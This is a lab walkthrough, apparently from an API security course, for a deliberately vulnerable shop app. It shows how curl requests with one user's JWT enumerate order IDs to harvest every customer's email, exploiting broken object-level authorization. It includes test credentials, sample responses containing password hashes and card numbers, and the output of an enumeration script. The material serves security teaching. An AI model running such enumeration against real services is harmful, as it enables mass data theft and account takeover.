# Resource enumeration

Attackers will experiment and try to find other ways of using API endpoints that just those used by the web or mobile applications.

## Attempt 1

Try different ways of calling the user endpoint with another user's email address. In real life a penetration tester (or attacker) would create multiple accounts for testing. Here you can use one of the pre-loaded users. Odille won't mind if you use their account: `overrillo0@redcross.org` and password `QkYvxNZUiP`.

First get a JWT token.

```bash
curl -X POST http://<hostname>:<port>/auth/login -H "Content-Type: application/json" -d "{\"email\":\"overrillo0@redcross.org\",\"password\":\"QkYvxNZUiP\"}"

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2M2VlNzVkMzRkNWQ4YmI0MTAwNDNkN2IiLCJlbWFpbCI6Im92ZXJyaWxsbzBAcmVkY3Jvc3Mub3JnIiwicGFzc3dvcmQiOiIkMmIkMTAkSkR3dnhpVFFPVllKaGpCUXJ2QXJwLlM4VTg1RW1WaTE1VThocmM3NXYvQ0lpRmFvSzV0UzYiLCJmaXJzdF9uYW1lIjoiT2RpbGxlIiwibGFzdF9uYW1lIjoiVmVycmlsbG8iLCJhZGRyZXNzIjoiOSBEcmV3cnkgQ3Jvc3NpbmciLCJjaXR5IjoiRG9uZ2R1IiwiY291bnRyeSI6IkNoaW5hIiwicGhvbmUiOiIrODYgKDcwOSkgNzEzLTA2MzAiLCJjcmVkaXRfY2FyZCI6IjQwNDEzNzg3NTUzNzc0NzMiLCJpYXQiOjE2ODA1MjE0NTd9.M4NKqiTQbkIDfPZgXu2ME4tSh_k1-9OAloTYYFLkhBQ"}
```

Now try the user endpoint that was used by the web application. We know it filters automatically by the user that is logged in, but we just want to see what we get. 

```bash
curl -X GET http://<hostname>:<port>/user -H "Content-Type: application/json" -H "Authorization: Bearer <token>"

{"_id":"63ee75d34d5d8bb410043d7b","email":"overrillo0@redcross.org","password":"$2b$10$JDwvxiTQOVYJhjBQrvArp.S8U85EmVi15U8hrc75v/CIiFaoK5tS6","first_name":"Odille","last_name":"Verrillo","address":"9 Drewry Crossing","city":"Dongdu","country":"China","phone":"+86 (709) 713-0630","credit_card":"4041378755377473"}
```

We can see that it returns the same information as we've previously seen as payload for the JWT token. Let's see if we can find another way of accessing this data which might lead to being able to access other users' information.

Try passing in the MongoDB _id value as a resource ID. You'll notice it fails. 

```bash
curl -X GET http://<hostname>:<port>/user/63ee75d34d5d8bb410043d7b -H "Content-Type: application/json" -H "Authorization: Bearer <token>"

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /user/63ee75d34d5d8bb410043d7b</pre>
</body>
</html>
```

Try passing in the email address as a resource ID. This fails as well.

```bash 
curl -X GET http://<hostname>:<port>/user/overillo0@redcross.org -H "Content-Type: application/json" -H "Authorization: Bearer <token>"

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /user/overrillo0@redcross.org</pre>
</body>
</html>
```

Finally, let's try passing in the email address as a query parameter. 

```bash
curl -X GET http://<hostname>:<port>/user?email=overillo0@redcross.org -H "Content-Type: application/json" -H "Authorization: Bearer <token>"

{"_id":"63ee75d34d5d8bb410043d7b","email":"overrillo0@redcross.org","password":"$2b$10$JDwvxiTQOVYJhjBQrvArp.S8U85EmVi15U8hrc75v/CIiFaoK5tS6","first_name":"Odille","last_name":"Verrillo","address":"9 Drewry Crossing","city":"Dongdu","country":"China","phone":"+86 (709) 713-0630","credit_card":"4041378755377473"}
```

Interestingly, we get a valid response. Let's see if we can query  another email address with this user's JWT token. We can use one of the email addresses we've uncovered before. Unfortunately, it returns the user info for the logged in user, so it seems like the query parameter is ignored. 

```bash
curl -X GET http://<hostname>:<port>/user?email=cdonnell5@desdev.cn -H "Content-Type: application/json" -H "Authorization: Bearer <token>"

{"_id":"63ee75d34d5d8bb410043d7b","email":"overrillo0@redcross.org","password":"$2b$10$JDwvxiTQOVYJhjBQrvArp.S8U85EmVi15U8hrc75v/CIiFaoK5tS6","first_name":"Odille","last_name":"Verrillo","address":"9 Drewry Crossing","city":"Dongdu","country":"China","phone":"+86 (709) 713-0630","credit_card":"4041378755377473"}
```

## Attempt 2

From the mitmproxy logs we've seen that the order history for the user is retrieved by a single API call to the `/order` endpoint. A common pattern with APIs is to query a collection of resources via an endpoint, and fetch the details for a specific resource by specifying the resource ID in the url. 

Let's try to fetch the details for a single order. We know order 2234 was placed by Odille and we'll try this first. 

```bash
curl -X GET http://<hostname>:<port>/order/2234 -H "Content-Type: application/json" -H "Authorization: Bearer <token>"

{"_id":"640f23b2739bbddad5f5f251","number":2234,"user":{"_id":"63ee75d34d5d8bb410043d7b","email":"overrillo0@redcross.org"},"orderLines":[{"product":{"_id":"63ee75d3af3b3774c258adea","number":4,"title":"Mens Casual Slim Fit","price":15.99,"description":"The color could be slightly different between on the screen and in practice. / Please note that body builds vary by person, therefore, detailed size information should be reviewed below on the product description.","category":"men's clothing","image":"img/71YXzeOuslL._AC_UY879_.jpg","rating":{"rate":2.1,"count":430,"_id":"642abdc078417119cee7b3c7"}},"quantity":1,"_id":"640f23b2739bbddad5f5f252","total":15.99},{"product":{"_id":"63ee75d3af3b3774c258adf7","number":5,"title":"John Hardy Women's Legends Naga Gold & Silver Dragon Station Chain Bracelet","price":695,"description":"From our Legends Collection, the Naga was inspired by the mythical water dragon that protects the ocean's pearl. Wear facing inward to be bestowed with love and abundance, or outward for protection.","category":"jewelery","image":"img/71pWzhdJNwL._AC_UL640_QL65_ML3_.jpg","rating":{"rate":4.6,"count":400,"_id":"642abdc078417119cee7b3c9"}},"quantity":2,"_id":"640f23b2739bbddad5f5f253","total":1390},{"product":{"_id":"63ee75d3af3b3774c258adf5","number":18,"title":"MBJ Women's Solid Short Sleeve Boat Neck V ","price":9.85,"description":"95% RAYON 5% SPANDEX, Made in USA or Imported, Do Not Bleach, Lightweight fabric with great stretch for comfort, Ribbed on sleeves and neckline / Double stitching on bottom hem","category":"women's clothing","image":"img/71z3kpMAYsL._AC_UY879_.jpg","rating":{"rate":4.7,"count":130,"_id":"642abdc078417119cee7b3c8"}},"quantity":3,"_id":"640f23b2739bbddad5f5f254","total":29.55}],"date":"2023-03-13T13:22:58.166Z","total":1435.54,"__v":0}
```

Interestingly enough, this works! Let's see if we can get the details of others orders. Let's just increase the order number and see what we get.

```bash
curl -X GET http://<hostname>:<port>/order/2235 -H "Content-Type: application/json" -H "Authorization: Bearer <token>"

{"_id":"640f23b2739bbddad5f5f22c","number":2235,"user":{"_id":"63ee75d34d5d8bb410043d7c","email":"pchampkin2@t.co"},"orderLines":[{"product":{"_id":"63ee75d3af3b3774c258adf5","number":18,"title":"MBJ Women's Solid Short Sleeve Boat Neck V ","price":9.85,"description":"95% RAYON 5% SPANDEX, Made in USA or Imported, Do Not Bleach, Lightweight fabric with great stretch for comfort, Ribbed on sleeves and neckline / Double stitching on bottom hem","category":"women's clothing","image":"img/71z3kpMAYsL._AC_UY879_.jpg","rating":{"rate":4.7,"count":130,"_id":"642abe4d78417119cee7b3d0"}},"quantity":3,"_id":"640f23b2739bbddad5f5f22d","total":29.55},{"product":{"_id":"63ee75d3af3b3774c258adea","number":4,"title":"Mens Casual Slim Fit","price":15.99,"description":"The color could be slightly different between on the screen and in practice. / Please note that body builds vary by person, therefore, detailed size information should be reviewed below on the product description.","category":"men's clothing","image":"img/71YXzeOuslL._AC_UY879_.jpg","rating":{"rate":2.1,"count":430,"_id":"642abe4d78417119cee7b3cf"}},"quantity":4,"_id":"640f23b2739bbddad5f5f22e","total":63.96}],"date":"2023-03-13T13:22:58.160Z","total":93.51,"__v":0}
```

This is where it becomes really interesting! Like most applications, the Deliver application uses an object modeling framework ([Mongoose](https://mongoosejs.com/) in this case). Such frameworks simplify the developer's job for handling data stored in databases. You can see here that the developer lets the object modeling framework fetch and fill related objects in the response. Here we have the full product details as well as a limited set of user details. The most important piece of information for us, is the user's email address. 

This shows us that an attacker can use any user account to query order information of any user - themselves and other users - simply by trying order numbers. I've written a helper script that will enumerate order numbers between a minimum and maximum value and extract all unique email addresses for the orders found. 

```bash
deliver orders token.txt emails.txt
______ _____ _     _____ _   _ ___________
|  _  \  ___| |   |_   _| | | |  ___| ___ \
| | | | |__ | |     | | | | | | |__ | |_/ /
| | | |  __|| |     | | | | | |  __||    /
| |/ /| |___| |_____| |_\ \_/ / |___| |\ \
|___/ \____/\_____/\___/ \___/\____/\_| \_|


Attacking http:/<hostname>:<port>/order

[==================================================] 100% 0.0s


Duration: 12.447 secs
Exctracted 1000 email addresses from 3009 orders
``` 

The `emails.txt` file now contains all email addresses of all registered users that have placed an order at some point. We already know that we can reset the password for any account we know, which means that we have now successfully compromised the entire set of account data in the DELIVER app.

In this example we've seen another occurrence of an [OWASP API top 10](https://owasp.org/www-project-api-security/) vulnerability:

- [API1-2019: Broken Object-Level Authorization](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa1-broken-object-level-authorization.md) as we are able to access data from other users.